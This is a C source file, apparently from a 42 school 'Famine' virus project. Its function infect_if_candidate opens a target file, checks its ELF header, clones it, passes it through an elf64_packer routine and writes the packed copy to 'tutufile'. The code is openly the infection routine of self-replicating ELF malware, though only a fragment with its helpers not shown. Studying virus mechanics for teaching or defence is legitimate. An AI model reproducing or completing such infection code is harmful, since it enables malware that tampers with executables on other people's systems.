/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/06 05:51:10 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infect.h"
#include "syscall.h"
#include "accessors.h"

inline void		infect_if_candidate(const char *file)
{
	unsigned char	e_ident[16];
	int		fd = famine_open(file, O_RDONLY);

	if (fd < 0) return;
	if (famine_read(fd, e_ident, 16) < 16) return;

	struct famine	food;
	set_endian(&food.endians, e_ident[EI_DATA] == ELFDATA2MSB);

	famine_close(fd);

	food.original_safe = original_accessor(file);
	if (food.original_safe.ptr == NULL) return;

	food.clone_safe = clone_accessor(food.original_safe.filesize);
	if (food.clone_safe.ptr == NULL) return;

	elf64_packer(food, food.original_safe.filesize);
	write_clone_file(food.clone_safe, "tutufile");

	free_accessor(food.original_safe);
	free_accessor(food.clone_safe);
}
